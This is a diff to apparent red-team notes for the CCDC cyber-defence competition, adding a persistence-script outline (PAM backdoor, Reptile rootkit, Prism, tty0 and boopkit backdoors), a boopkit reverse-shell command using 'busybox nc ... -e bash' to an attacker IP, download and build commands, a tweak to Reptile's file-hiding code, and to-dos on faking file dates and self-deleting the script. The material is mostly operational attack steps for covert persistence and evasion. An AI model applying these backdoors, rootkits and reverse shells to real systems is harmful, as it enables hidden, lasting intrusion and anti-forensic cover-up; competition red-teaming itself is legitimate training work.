@@ -77,15 +77,23 @@ pagetitle: Red Teaming for CCDC
     - Then update GP with `gpupdate /force`
 
 **Linux:**
+- Our persistence script
+  - Linux < 4.x
+    - Pam backdoor (out is /opt/bds/pam_out)
+    - Reptile rootkit with bds prefix
+    - Prism backdoor
+    - tty0 backdoor
+  - Linux 5.x/6.x
+    - Pam backdoor
+    - BDS with bds prefix (comes with pingable backdoor)
 - [PANIX](https://github.com/Aegrah/PANIX)
   - One-stop shop for lots of persistence methods, this thing is a great reference
 - Todo:
   - Touch up script
-    - Clean up boopkit
-      - `/root/.boopkit/` and install dir `/boopkit/`
     - Make sure all dates are changed as necessary
     - Fix script not self-deleting
-  - Test on arch? Def test on centos/fedora
+    - Fix boopkit invocation
+    - Test on arch? Def test on centos/fedora
 - [Boopkit](https://github.com/krisnova/boopkit)
   - Sneaky amazing backdoor that functions via back checksum TCP packets
   - `wget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.4.1.tar.gz`
@@ -93,6 +101,7 @@ pagetitle: Red Teaming for CCDC
   - Then, run on victim with `boopkit -i {network_interface} -q`
     - We need to find a way to get the default network interface
   - Then, after making on Kali, can run `boopkit-boop -rhost {target} -rport 3535 -c '{command}' -lhost {kali_IP} -lport {kali_port}`
+    - E.g. `sudo boopkit-boop -lhost 192.168.204.130 -lport 4444 -rhost 192.168.204.139 -rport 3535 -c 'busybox nc 192.168.204.130 4444 -e bash'`
   - Listens on TCP 3545 
 - [Prism](https://github.com/andreafabrizi/prism)
   - `gcc -DDETACH -DNORENAME -Wall -s -o prism prism.c` or if that fails just download and run `prism`
@@ -119,7 +128,7 @@ pagetitle: Red Teaming for CCDC
     - `make menuconfig`, `make`, and `make install`
   - Bugs:
     - Reptile will hide more stuff than necessary in affected directories
-      - Until we fix this, we can rename `/reptile` to `/reptiled`
+      - Fixed by changing kernel main.c to use `if (strstr(name->name, HIDE) && hidden) {return NULL;}` instead of existing logic
     - Couldn't get kali-side build working, so we can use prism for the shell
   - Usage:
     - `/reptile/reptile_cmd {show/hide}` to show/hide all hidden files
